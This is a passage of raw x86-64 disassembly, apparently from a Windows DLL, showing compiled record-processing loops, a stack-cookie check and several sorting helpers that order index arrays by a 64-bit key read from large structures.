   1800033fa:	e8 21 15 00 00       	call   0x180004920
   1800033ff:	44 8b 4d 80          	mov    -0x80(%rbp),%r9d
   180003403:	ff c6                	inc    %esi
   180003405:	49 83 c6 70          	add    $0x70,%r14
   180003409:	41 3b f1             	cmp    %r9d,%esi
   18000340c:	0f 8c 7e fe ff ff    	jl     0x180003290
   180003412:	4c 8b b4 24 58 01 00 	mov    0x158(%rsp),%r14
   180003419:	00 
   18000341a:	4c 8b ac 24 60 01 00 	mov    0x160(%rsp),%r13
   180003421:	00 
   180003422:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   180003426:	e8 f5 14 00 00       	call   0x180004920
   18000342b:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000342f:	e8 ec 14 00 00       	call   0x180004920
   180003434:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   180003438:	e8 e3 14 00 00       	call   0x180004920
   18000343d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   180003441:	e8 da 14 00 00       	call   0x180004920
   180003446:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   18000344a:	e8 d1 14 00 00       	call   0x180004920
   18000344f:	4c 8b a4 24 68 01 00 	mov    0x168(%rsp),%r12
   180003456:	00 
   180003457:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   18000345b:	e8 c0 14 00 00       	call   0x180004920
   180003460:	48 8d 4d b8          	lea    -0x48(%rbp),%rcx
   180003464:	e8 b7 14 00 00       	call   0x180004920
   180003469:	4c 8b bc 24 50 01 00 	mov    0x150(%rsp),%r15
   180003470:	00 
   180003471:	48 8b b4 24 a0 01 00 	mov    0x1a0(%rsp),%rsi
   180003478:	00 
   180003479:	39 7b 48             	cmp    %edi,0x48(%rbx)
   18000347c:	0f 84 aa 00 00 00    	je     0x18000352c
   180003482:	39 7b 38             	cmp    %edi,0x38(%rbx)
   180003485:	0f 8e a1 00 00 00    	jle    0x18000352c
   18000348b:	4c 8b c7             	mov    %rdi,%r8
   18000348e:	66 90                	xchg   %ax,%ax
   180003490:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   180003494:	41 8b 84 08 20 01 00 	mov    0x120(%r8,%rcx,1),%eax
   18000349b:	00 
   18000349c:	a8 10                	test   $0x10,%al
   18000349e:	74 7a                	je     0x18000351a
   1800034a0:	a8 40                	test   $0x40,%al
   1800034a2:	74 14                	je     0x1800034b8
   1800034a4:	8b 43 58             	mov    0x58(%rbx),%eax
   1800034a7:	99                   	cltd
   1800034a8:	f7 7b 4c             	idivl  0x4c(%rbx)
   1800034ab:	41 89 84 08 38 01 00 	mov    %eax,0x138(%r8,%rcx,1)
   1800034b2:	00 
   1800034b3:	8b 43 54             	mov    0x54(%rbx),%eax
   1800034b6:	eb 12                	jmp    0x1800034ca
   1800034b8:	8b 43 54             	mov    0x54(%rbx),%eax
   1800034bb:	99                   	cltd
   1800034bc:	f7 7b 4c             	idivl  0x4c(%rbx)
   1800034bf:	41 89 84 08 38 01 00 	mov    %eax,0x138(%r8,%rcx,1)
   1800034c6:	00 
   1800034c7:	8b 43 58             	mov    0x58(%rbx),%eax
   1800034ca:	99                   	cltd
   1800034cb:	f7 7b 50             	idivl  0x50(%rbx)
   1800034ce:	41 89 84 08 3c 01 00 	mov    %eax,0x13c(%r8,%rcx,1)
   1800034d5:	00 
   1800034d6:	41 8b 84 08 54 01 00 	mov    0x154(%r8,%rcx,1),%eax
   1800034dd:	00 
   1800034de:	41 0f af 84 08 38 01 	imul   0x138(%r8,%rcx,1),%eax
   1800034e5:	00 00 
   1800034e7:	41 89 84 08 30 01 00 	mov    %eax,0x130(%r8,%rcx,1)
   1800034ee:	00 
   1800034ef:	41 8b 84 08 58 01 00 	mov    0x158(%r8,%rcx,1),%eax
   1800034f6:	00 
   1800034f7:	41 0f af 84 08 3c 01 	imul   0x13c(%r8,%rcx,1),%eax
   1800034fe:	00 00 
   180003500:	41 89 84 08 34 01 00 	mov    %eax,0x134(%r8,%rcx,1)
   180003507:	00 
   180003508:	41 0f 10 84 08 30 01 	movups 0x130(%r8,%rcx,1),%xmm0
   18000350f:	00 00 
   180003511:	41 0f 11 84 08 40 01 	movups %xmm0,0x140(%r8,%rcx,1)
   180003518:	00 00 
   18000351a:	ff c7                	inc    %edi
   18000351c:	49 81 c0 d0 01 00 00 	add    $0x1d0,%r8
   180003523:	3b 7b 38             	cmp    0x38(%rbx),%edi
   180003526:	0f 8c 64 ff ff ff    	jl     0x180003490
   18000352c:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   180003530:	48 33 cc             	xor    %rsp,%rcx
   180003533:	e8 f8 1c 00 00       	call   0x180005230
   180003538:	48 81 c4 70 01 00 00 	add    $0x170,%rsp
   18000353f:	5f                   	pop    %rdi
   180003540:	5b                   	pop    %rbx
   180003541:	5d                   	pop    %rbp
   180003542:	c3                   	ret
   180003543:	cc                   	int3
   180003544:	cc                   	int3
   180003545:	cc                   	int3
   180003546:	cc                   	int3
   180003547:	cc                   	int3
   180003548:	cc                   	int3
   180003549:	cc                   	int3
   18000354a:	cc                   	int3
   18000354b:	cc                   	int3
   18000354c:	cc                   	int3
   18000354d:	cc                   	int3
   18000354e:	cc                   	int3
   18000354f:	cc                   	int3
   180003550:	48 3b ca             	cmp    %rdx,%rcx
   180003553:	0f 84 77 01 00 00    	je     0x1800036d0
   180003559:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000355e:	56                   	push   %rsi
   18000355f:	41 56                	push   %r14
   180003561:	48 83 ec 28          	sub    $0x28,%rsp
   180003565:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   18000356a:	48 8d 59 04          	lea    0x4(%rcx),%rbx
   18000356e:	4c 8b f2             	mov    %rdx,%r14
   180003571:	48 8b f1             	mov    %rcx,%rsi
   180003574:	48 3b da             	cmp    %rdx,%rbx
   180003577:	0f 84 47 01 00 00    	je     0x1800036c4
   18000357d:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   180003582:	48 89 7c 24 58       	mov    %rdi,0x58(%rsp)
   180003587:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   18000358c:	41 bf 04 00 00 00    	mov    $0x4,%r15d
   180003592:	4c 2b f9             	sub    %rcx,%r15
   180003595:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   18000359c:	00 00 00 00 
   1800035a0:	48 63 06             	movslq (%rsi),%rax
   1800035a3:	48 63 2b             	movslq (%rbx),%rbp
   1800035a6:	48 8b fb             	mov    %rbx,%rdi
   1800035a9:	48 69 c8 24 06 00 00 	imul   $0x624,%rax,%rcx
   1800035b0:	4a 63 84 01 08 01 00 	movslq 0x108(%rcx,%r8,1),%rax
   1800035b7:	00 
   1800035b8:	4a 63 94 01 0c 01 00 	movslq 0x10c(%rcx,%r8,1),%rdx
   1800035bf:	00 
   1800035c0:	4c 69 d5 24 06 00 00 	imul   $0x624,%rbp,%r10
   1800035c7:	4d 03 d0             	add    %r8,%r10
   1800035ca:	48 c1 e2 20          	shl    $0x20,%rdx
   1800035ce:	49 63 8a 0c 01 00 00 	movslq 0x10c(%r10),%rcx
   1800035d5:	48 0b d0             	or     %rax,%rdx
   1800035d8:	49 63 82 08 01 00 00 	movslq 0x108(%r10),%rax
   1800035df:	48 c1 e1 20          	shl    $0x20,%rcx
   1800035e3:	48 0b c8             	or     %rax,%rcx
   1800035e6:	48 3b ca             	cmp    %rdx,%rcx
   1800035e9:	73 31                	jae    0x18000361c
   1800035eb:	49 8d 47 fc          	lea    -0x4(%r15),%rax
   1800035ef:	48 8b cb             	mov    %rbx,%rcx
   1800035f2:	48 8b d6             	mov    %rsi,%rdx
   1800035f5:	48 03 c3             	add    %rbx,%rax
   1800035f8:	48 c1 f8 02          	sar    $0x2,%rax
   1800035fc:	4c 8d 04 85 00 00 00 	lea    0x0(,%rax,4),%r8
   180003603:	00 
   180003604:	49 2b c8             	sub    %r8,%rcx
   180003607:	48 83 c1 04          	add    $0x4,%rcx
   18000360b:	e8 e0 20 00 00       	call   0x1800056f0
   180003610:	4c 8b 44 24 50       	mov    0x50(%rsp),%r8
   180003615:	89 2e                	mov    %ebp,(%rsi)
   180003617:	e9 8c 00 00 00       	jmp    0x1800036a8
   18000361c:	4c 63 5b fc          	movslq -0x4(%rbx),%r11
   180003620:	4c 8d 4b fc          	lea    -0x4(%rbx),%r9
   180003624:	49 69 cb 24 06 00 00 	imul   $0x624,%r11,%rcx
   18000362b:	4a 63 84 01 08 01 00 	movslq 0x108(%rcx,%r8,1),%rax
   180003632:	00 
   180003633:	4a 63 94 01 0c 01 00 	movslq 0x10c(%rcx,%r8,1),%rdx
   18000363a:	00 
   18000363b:	49 63 8a 0c 01 00 00 	movslq 0x10c(%r10),%rcx
   180003642:	48 c1 e2 20          	shl    $0x20,%rdx
   180003646:	48 c1 e1 20          	shl    $0x20,%rcx
   18000364a:	48 0b d0             	or     %rax,%rdx
   18000364d:	49 63 82 08 01 00 00 	movslq 0x108(%r10),%rax
   180003654:	48 0b c8             	or     %rax,%rcx
   180003657:	48 3b ca             	cmp    %rdx,%rcx
   18000365a:	73 4a                	jae    0x1800036a6
   18000365c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003660:	44 89 1f             	mov    %r11d,(%rdi)
   180003663:	4d 63 59 fc          	movslq -0x4(%r9),%r11
   180003667:	49 8b f9             	mov    %r9,%rdi
   18000366a:	49 83 e9 04          	sub    $0x4,%r9
   18000366e:	49 69 cb 24 06 00 00 	imul   $0x624,%r11,%rcx
   180003675:	4a 63 84 01 08 01 00 	movslq 0x108(%rcx,%r8,1),%rax
   18000367c:	00 
   18000367d:	4a 63 94 01 0c 01 00 	movslq 0x10c(%rcx,%r8,1),%rdx
   180003684:	00 
   180003685:	49 63 8a 0c 01 00 00 	movslq 0x10c(%r10),%rcx
   18000368c:	48 c1 e2 20          	shl    $0x20,%rdx
   180003690:	48 0b d0             	or     %rax,%rdx
   180003693:	49 63 82 08 01 00 00 	movslq 0x108(%r10),%rax
   18000369a:	48 c1 e1 20          	shl    $0x20,%rcx
   18000369e:	48 0b c8             	or     %rax,%rcx
   1800036a1:	48 3b ca             	cmp    %rdx,%rcx
   1800036a4:	72 ba                	jb     0x180003660
   1800036a6:	89 2f                	mov    %ebp,(%rdi)
   1800036a8:	48 83 c3 04          	add    $0x4,%rbx
   1800036ac:	49 3b de             	cmp    %r14,%rbx
   1800036af:	0f 85 eb fe ff ff    	jne    0x1800035a0
   1800036b5:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   1800036ba:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1800036bf:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1800036c4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800036c9:	48 83 c4 28          	add    $0x28,%rsp
   1800036cd:	41 5e                	pop    %r14
   1800036cf:	5e                   	pop    %rsi
   1800036d0:	c3                   	ret
   1800036d1:	cc                   	int3
   1800036d2:	cc                   	int3
   1800036d3:	cc                   	int3
   1800036d4:	cc                   	int3
   1800036d5:	cc                   	int3
   1800036d6:	cc                   	int3
   1800036d7:	cc                   	int3
   1800036d8:	cc                   	int3
   1800036d9:	cc                   	int3
   1800036da:	cc                   	int3
   1800036db:	cc                   	int3
   1800036dc:	cc                   	int3
   1800036dd:	cc                   	int3
   1800036de:	cc                   	int3
   1800036df:	cc                   	int3
   1800036e0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800036e5:	56                   	push   %rsi
   1800036e6:	57                   	push   %rdi
   1800036e7:	48 8b f2             	mov    %rdx,%rsi
   1800036ea:	48 8b d9             	mov    %rcx,%rbx
   1800036ed:	48 2b f1             	sub    %rcx,%rsi
   1800036f0:	48 c1 fe 02          	sar    $0x2,%rsi
   1800036f4:	48 8b c6             	mov    %rsi,%rax
   1800036f7:	48 99                	cqto
   1800036f9:	48 2b c2             	sub    %rdx,%rax
   1800036fc:	48 d1 f8             	sar    $1,%rax
   1800036ff:	48 8b f8             	mov    %rax,%rdi
   180003702:	48 85 c0             	test   %rax,%rax
   180003705:	0f 8e 4a 01 00 00    	jle    0x180003855
   18000370b:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180003710:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   180003715:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   18000371a:	4c 8d 34 45 02 00 00 	lea    0x2(,%rax,2),%r14
   180003721:	00 
   180003722:	0f 1f 40 00          	nopl   0x0(%rax)
   180003726:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000372d:	00 00 00 
   180003730:	4c 63 7c bb fc       	movslq -0x4(%rbx,%rdi,4),%r15
   180003735:	48 ff cf             	dec    %rdi
   180003738:	49 83 ee 02          	sub    $0x2,%r14
   18000373c:	4c 8b df             	mov    %rdi,%r11
   18000373f:	49 8b ce             	mov    %r14,%rcx
   180003742:	4c 3b f6             	cmp    %rsi,%r14
   180003745:	7d 6d                	jge    0x1800037b4
   180003747:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000374e:	00 00 
   180003750:	48 63 04 8b          	movslq (%rbx,%rcx,4),%rax
   180003754:	4c 69 d0 24 06 00 00 	imul   $0x624,%rax,%r10
   18000375b:	48 63 44 8b fc       	movslq -0x4(%rbx,%rcx,4),%rax
   180003760:	48 69 d0 24 06 00 00 	imul   $0x624,%rax,%rdx
   180003767:	4a 63 84 02 08 01 00 	movslq 0x108(%rdx,%r8,1),%rax
   18000376e:	00 
   18000376f:	4e 63 8c 02 0c 01 00 	movslq 0x10c(%rdx,%r8,1),%r9
   180003776:	00 
   180003777:	4b 63 94 02 0c 01 00 	movslq 0x10c(%r10,%r8,1),%rdx
   18000377e:	00 
   18000377f:	49 c1 e1 20          	shl    $0x20,%r9
   180003783:	48 c1 e2 20          	shl    $0x20,%rdx
   180003787:	4c 0b c8             	or     %rax,%r9
   18000378a:	4b 63 84 02 08 01 00 	movslq 0x108(%r10,%r8,1),%rax
   180003791:	00 
   180003792:	48 0b d0             	or     %rax,%rdx
   180003795:	49 3b d1             	cmp    %r9,%rdx
   180003798:	73 03                	jae    0x18000379d
   18000379a:	48 ff c9             	dec    %rcx
   18000379d:	8b 04 8b             	mov    (%rbx,%rcx,4),%eax
   1800037a0:	42 89 04 9b          	mov    %eax,(%rbx,%r11,4)
   1800037a4:	4c 8b d9             	mov    %rcx,%r11
   1800037a7:	48 8d 0c 4d 02 00 00 	lea    0x2(,%rcx,2),%rcx
   1800037ae:	00 
   1800037af:	48 3b ce             	cmp    %rsi,%rcx
   1800037b2:	7c 9c                	jl     0x180003750
   1800037b4:	48 3b ce             	cmp    %rsi,%rcx
   1800037b7:	75 0c                	jne    0x1800037c5
   1800037b9:	8b 44 b3 fc          	mov    -0x4(%rbx,%rsi,4),%eax
   1800037bd:	42 89 04 9b          	mov    %eax,(%rbx,%r11,4)
   1800037c1:	4c 8d 5e ff          	lea    -0x1(%rsi),%r11
   1800037c5:	49 8d 43 ff          	lea    -0x1(%r11),%rax
   1800037c9:	48 99                	cqto
   1800037cb:	48 2b c2             	sub    %rdx,%rax
   1800037ce:	48 d1 f8             	sar    $1,%rax
   1800037d1:	4c 8b c8             	mov    %rax,%r9
   1800037d4:	49 3b fb             	cmp    %r11,%rdi
   1800037d7:	7d 60                	jge    0x180003839
   1800037d9:	49 69 ef 24 06 00 00 	imul   $0x624,%r15,%rbp
   1800037e0:	4e 63 14 8b          	movslq (%rbx,%r9,4),%r10
   1800037e4:	4a 63 8c 05 0c 01 00 	movslq 0x10c(%rbp,%r8,1),%rcx
   1800037eb:	00 
   1800037ec:	48 c1 e1 20          	shl    $0x20,%rcx
   1800037f0:	49 69 c2 24 06 00 00 	imul   $0x624,%r10,%rax
   1800037f7:	4a 63 94 00 0c 01 00 	movslq 0x10c(%rax,%r8,1),%rdx
   1800037fe:	00 
   1800037ff:	4a 63 84 00 08 01 00 	movslq 0x108(%rax,%r8,1),%rax
   180003806:	00 
   180003807:	48 c1 e2 20          	shl    $0x20,%rdx
   18000380b:	48 0b d0             	or     %rax,%rdx
   18000380e:	4a 63 84 05 08 01 00 	movslq 0x108(%rbp,%r8,1),%rax
   180003815:	00 
   180003816:	48 0b c8             	or     %rax,%rcx
   180003819:	48 3b d1             	cmp    %rcx,%rdx
   18000381c:	73 1b                	jae    0x180003839
   18000381e:	49 8d 41 ff          	lea    -0x1(%r9),%rax
   180003822:	46 89 14 9b          	mov    %r10d,(%rbx,%r11,4)
   180003826:	4d 8b d9             	mov    %r9,%r11
   180003829:	48 99                	cqto
   18000382b:	48 2b c2             	sub    %rdx,%rax
   18000382e:	48 d1 f8             	sar    $1,%rax
   180003831:	4c 8b c8             	mov    %rax,%r9
   180003834:	49 3b fb             	cmp    %r11,%rdi
   180003837:	7c a7                	jl     0x1800037e0
   180003839:	46 89 3c 9b          	mov    %r15d,(%rbx,%r11,4)
   18000383d:	48 85 ff             	test   %rdi,%rdi
   180003840:	0f 8f ea fe ff ff    	jg     0x180003730
   180003846:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   18000384b:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   180003850:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   180003855:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000385a:	5f                   	pop    %rdi
   18000385b:	5e                   	pop    %rsi
   18000385c:	c3                   	ret
   18000385d:	cc                   	int3
   18000385e:	cc                   	int3
   18000385f:	cc                   	int3
   180003860:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003865:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000386a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000386f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180003874:	41 56                	push   %r14
   180003876:	48 63 2a             	movslq (%rdx),%rbp
   180003879:	48 8b f1             	mov    %rcx,%rsi
   18000387c:	48 8b fa             	mov    %rdx,%rdi
   18000387f:	48 63 11             	movslq (%rcx),%rdx
   180003882:	4d 8b f0             	mov    %r8,%r14
   180003885:	48 69 dd 24 06 00 00 	imul   $0x624,%rbp,%rbx
   18000388c:	4a 63 8c 0b 0c 01 00 	movslq 0x10c(%rbx,%r9,1),%rcx
   180003893:	00 
   180003894:	48 c1 e1 20          	shl    $0x20,%rcx
   180003898:	4c 69 d2 24 06 00 00 	imul   $0x624,%rdx,%r10
   18000389f:	4b 63 84 0a 08 01 00 	movslq 0x108(%r10,%r9,1),%rax
   1800038a6:	00 
   1800038a7:	4f 63 9c 0a 0c 01 00 	movslq 0x10c(%r10,%r9,1),%r11
   1800038ae:	00 
   1800038af:	49 c1 e3 20          	shl    $0x20,%r11
   1800038b3:	4c 0b d8             	or     %rax,%r11
   1800038b6:	4a 63 84 0b 08 01 00 	movslq 0x108(%rbx,%r9,1),%rax
   1800038bd:	00 
   1800038be:	48 0b c8             	or     %rax,%rcx
   1800038c1:	49 3b cb             	cmp    %r11,%rcx
   1800038c4:	73 04                	jae    0x1800038ca
   1800038c6:	89 17                	mov    %edx,(%rdi)
   1800038c8:	89 2e                	mov    %ebp,(%rsi)
   1800038ca:	48 63 07             	movslq (%rdi),%rax
   1800038cd:	4d 63 10             	movslq (%r8),%r10
   1800038d0:	48 69 c8 24 06 00 00 	imul   $0x624,%rax,%rcx
   1800038d7:	4d 69 c2 24 06 00 00 	imul   $0x624,%r10,%r8
   1800038de:	4a 63 84 09 08 01 00 	movslq 0x108(%rcx,%r9,1),%rax
   1800038e5:	00 
   1800038e6:	4a 63 94 09 0c 01 00 	movslq 0x10c(%rcx,%r9,1),%rdx
   1800038ed:	00 
   1800038ee:	4b 63 8c 08 0c 01 00 	movslq 0x10c(%r8,%r9,1),%rcx
   1800038f5:	00 
   1800038f6:	48 c1 e2 20          	shl    $0x20,%rdx
   1800038fa:	48 c1 e1 20          	shl    $0x20,%rcx
   1800038fe:	48 0b d0             	or     %rax,%rdx
   180003901:	4b 63 84 08 08 01 00 	movslq 0x108(%r8,%r9,1),%rax
   180003908:	00 
   180003909:	48 0b c8             	or     %rax,%rcx
   18000390c:	48 3b ca             	cmp    %rdx,%rcx
   18000390f:	73 52                	jae    0x180003963
   180003911:	8b 07                	mov    (%rdi),%eax
   180003913:	4d 69 c2 24 06 00 00 	imul   $0x624,%r10,%r8
   18000391a:	41 89 06             	mov    %eax,(%r14)
   18000391d:	44 89 17             	mov    %r10d,(%rdi)
   180003920:	4c 63 1e             	movslq (%rsi),%r11
   180003923:	49 69 cb 24 06 00 00 	imul   $0x624,%r11,%rcx
   18000392a:	4a 63 84 09 08 01 00 	movslq 0x108(%rcx,%r9,1),%rax
   180003931:	00 
   180003932:	4a 63 94 09 0c 01 00 	movslq 0x10c(%rcx,%r9,1),%rdx
   180003939:	00 
   18000393a:	4b 63 8c 08 0c 01 00 	movslq 0x10c(%r8,%r9,1),%rcx
   180003941:	00 
   180003942:	48 c1 e2 20          	shl    $0x20,%rdx
   180003946:	48 0b d0             	or     %rax,%rdx
   180003949:	4b 63 84 08 08 01 00 	movslq 0x108(%r8,%r9,1),%rax
   180003950:	00 
   180003951:	48 c1 e1 20          	shl    $0x20,%rcx
   180003955:	48 0b c8             	or     %rax,%rcx
   180003958:	48 3b ca             	cmp    %rdx,%rcx
   18000395b:	73 06                	jae    0x180003963
   18000395d:	44 89 1f             	mov    %r11d,(%rdi)
   180003960:	44 89 16             	mov    %r10d,(%rsi)
   180003963:	48 8b 5c 24 10       	mov    0x10(%rsp),%rbx
   180003968:	48 8b 6c 24 18       	mov    0x18(%rsp),%rbp
   18000396d:	48 8b 74 24 20       	mov    0x20(%rsp),%rsi
   180003972:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   180003977:	41 5e                	pop    %r14
   180003979:	c3                   	ret
   18000397a:	cc                   	int3
   18000397b:	cc                   	int3
   18000397c:	cc                   	int3
   18000397d:	cc                   	int3
   18000397e:	cc                   	int3
   18000397f:	cc                   	int3
   180003980:	40 53                	rex push %rbx
   180003982:	41 54                	push   %r12
   180003984:	41 57                	push   %r15
   180003986:	48 83 ec 20          	sub    $0x20,%rsp
   18000398a:	49 8b c0             	mov    %r8,%rax
   18000398d:	49 8b d9             	mov    %r9,%rbx
   180003990:	4d 8b f8             	mov    %r8,%r15
   180003993:	48 2b c1             	sub    %rcx,%rax
   180003996:	4c 8b e2             	mov    %rdx,%r12
   180003999:	48 c1 f8 02          	sar    $0x2,%rax
   18000399d:	48 83 f8 28          	cmp    $0x28,%rax
   1800039a1:	0f 8e a1 00 00 00    	jle    0x180003a48
   1800039a7:	48 ff c0             	inc    %rax
   1800039aa:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1800039af:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   1800039b4:	48 99                	cqto
   1800039b6:	48 89 7c 24 50       	mov    %rdi,0x50(%rsp)
   1800039bb:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   1800039c0:	83 e2 07             	and    $0x7,%edx
   1800039c3:	48 03 c2             	add    %rdx,%rax
   1800039c6:	48 c1 f8 03          	sar    $0x3,%rax
   1800039ca:	48 8d 34 85 00 00 00 	lea    0x0(,%rax,4),%rsi
   1800039d1:	00 
   1800039d2:	4c 8d 34 c5 00 00 00 	lea    0x0(,%rax,8),%r14
   1800039d9:	00 
   1800039da:	48 8d 2c 0e          	lea    (%rsi,%rcx,1),%rbp
   1800039de:	4d 8d 04 0e          	lea    (%r14,%rcx,1),%r8
   1800039e2:	48 8b d5             	mov    %rbp,%rdx
   1800039e5:	e8 76 fe ff ff       	call   0x180003860
   1800039ea:	49 8b cc             	mov    %r12,%rcx
   1800039ed:	4e 8d 04 26          	lea    (%rsi,%r12,1),%r8
   1800039f1:	48 2b ce             	sub    %rsi,%rcx
   1800039f4:	4c 8b cb             	mov    %rbx,%r9
   1800039f7:	49 8b d4             	mov    %r12,%rdx
   1800039fa:	e8 61 fe ff ff       	call   0x180003860
   1800039ff:	49 8b ff             	mov    %r15,%rdi
   180003a02:	49 8b cf             	mov    %r15,%rcx
   180003a05:	48 2b fe             	sub    %rsi,%rdi
   180003a08:	4c 8b cb             	mov    %rbx,%r9
   180003a0b:	4d 8b c7             	mov    %r15,%r8
   180003a0e:	48 8b d7             	mov    %rdi,%rdx
   180003a11:	49 2b ce             	sub    %r14,%rcx
   180003a14:	e8 47 fe ff ff       	call   0x180003860
   180003a19:	4c 8b cb             	mov    %rbx,%r9
   180003a1c:	4c 8b c7             	mov    %rdi,%r8
   180003a1f:	49 8b d4             	mov    %r12,%rdx
   180003a22:	48 8b cd             	mov    %rbp,%rcx
   180003a25:	e8 36 fe ff ff       	call   0x180003860
   180003a2a:	4c 8b 74 24 58       	mov    0x58(%rsp),%r14
   180003a2f:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180003a34:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   180003a39:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180003a3e:	48 83 c4 20          	add    $0x20,%rsp
   180003a42:	41 5f                	pop    %r15
   180003a44:	41 5c                	pop    %r12
   180003a46:	5b                   	pop    %rbx
   180003a47:	c3                   	ret
   180003a48:	e8 13 fe ff ff       	call   0x180003860
   180003a4d:	48 83 c4 20          	add    $0x20,%rsp
   180003a51:	41 5f                	pop    %r15
   180003a53:	41 5c                	pop    %r12
   180003a55:	5b                   	pop    %rbx
   180003a56:	c3                   	ret
   180003a57:	cc                   	int3
   180003a58:	cc                   	int3
   180003a59:	cc                   	int3
   180003a5a:	cc                   	int3
   180003a5b:	cc                   	int3
   180003a5c:	cc                   	int3
   180003a5d:	cc                   	int3
   180003a5e:	cc                   	int3
   180003a5f:	cc                   	int3
   180003a60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003a65:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003a6a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003a6f:	8b 01                	mov    (%rcx),%eax
   180003a71:	48 63 72 fc          	movslq -0x4(%rdx),%rsi
   180003a75:	48 8b fa             	mov    %rdx,%rdi
   180003a78:	48 2b f9             	sub    %rcx,%rdi
   180003a7b:	89 42 fc             	mov    %eax,-0x4(%rdx)
   180003a7e:	b8 02 00 00 00       	mov    $0x2,%eax
   180003a83:	48 83 ef 04          	sub    $0x4,%rdi
   180003a87:	45 33 db             	xor    %r11d,%r11d
   180003a8a:	48 8b d9             	mov    %rcx,%rbx
   180003a8d:	48 c1 ff 02          	sar    $0x2,%rdi
   180003a91:	48 3b c7             	cmp    %rdi,%rax
   180003a94:	7d 6e                	jge    0x180003b04
   180003a96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180003a9d:	00 00 00 
   180003aa0:	48 63 0c 83          	movslq (%rbx,%rax,4),%rcx
   180003aa4:	4c 69 d1 24 06 00 00 	imul   $0x624,%rcx,%r10
   180003aab:	48 63 4c 83 fc       	movslq -0x4(%rbx,%rax,4),%rcx
   180003ab0:	48 69 d1 24 06 00 00 	imul   $0x624,%rcx,%rdx
   180003ab7:	4a 63 8c 02 08 01 00 	movslq 0x108(%rdx,%r8,1),%rcx
   180003abe:	00 
   180003abf:	4e 63 8c 02 0c 01 00 	movslq 0x10c(%rdx,%r8,1),%r9
   180003ac6:	00 
   180003ac7:	4b 63 94 02 0c 01 00 	movslq 0x10c(%r10,%r8,1),%rdx
   180003ace:	00 
   180003acf:	49 c1 e1 20          	shl    $0x20,%r9
   180003ad3:	48 c1 e2 20          	shl    $0x20,%rdx
   180003ad7:	4c 0b c9             	or     %rcx,%r9
   180003ada:	4b 63 8c 02 08 01 00 	movslq 0x108(%r10,%r8,1),%rcx
   180003ae1:	00 
   180003ae2:	48 0b d1             	or     %rcx,%rdx
   180003ae5:	49 3b d1             	cmp    %r9,%rdx
   180003ae8:	73 03                	jae    0x180003aed
   180003aea:	48 ff c8             	dec    %rax
   180003aed:	8b 0c 83             	mov    (%rbx,%rax,4),%ecx
   180003af0:	42 89 0c 9b          	mov    %ecx,(%rbx,%r11,4)
   180003af4:	4c 8b d8             	mov    %rax,%r11
   180003af7:	48 8d 04 45 02 00 00 	lea    0x2(,%rax,2),%rax
   180003afe:	00 
   180003aff:	48 3b c7             	cmp    %rdi,%rax
   180003b02:	7c 9c                	jl     0x180003aa0
   180003b04:	75 0c                	jne    0x180003b12
   180003b06:	8b 44 bb fc          	mov    -0x4(%rbx,%rdi,4),%eax
   180003b0a:	42 89 04 9b          	mov    %eax,(%rbx,%r11,4)
   180003b0e:	4c 8d 5f ff          	lea    -0x1(%rdi),%r11
   180003b12:	49 8d 43 ff          	lea    -0x1(%r11),%rax
   180003b16:	48 99                	cqto
   180003b18:	48 2b c2             	sub    %rdx,%rax
   180003b1b:	48 d1 f8             	sar    $1,%rax
   180003b1e:	4c 8b c8             	mov    %rax,%r9
   180003b21:	4d 85 db             	test   %r11,%r11
   180003b24:	7e 63                	jle    0x180003b89
   180003b26:	48 69 fe 24 06 00 00 	imul   $0x624,%rsi,%rdi
   180003b2d:	0f 1f 00             	nopl   (%rax)
   180003b30:	4e 63 14 8b          	movslq (%rbx,%r9,4),%r10
   180003b34:	4a 63 8c 07 0c 01 00 	movslq 0x10c(%rdi,%r8,1),%rcx
   180003b3b:	00 
   180003b3c:	48 c1 e1 20          	shl    $0x20,%rcx
   180003b40:	49 69 c2 24 06 00 00 	imul   $0x624,%r10,%rax
   180003b47:	4a 63 94 00 0c 01 00 	movslq 0x10c(%rax,%r8,1),%rdx
   180003b4e:	00 
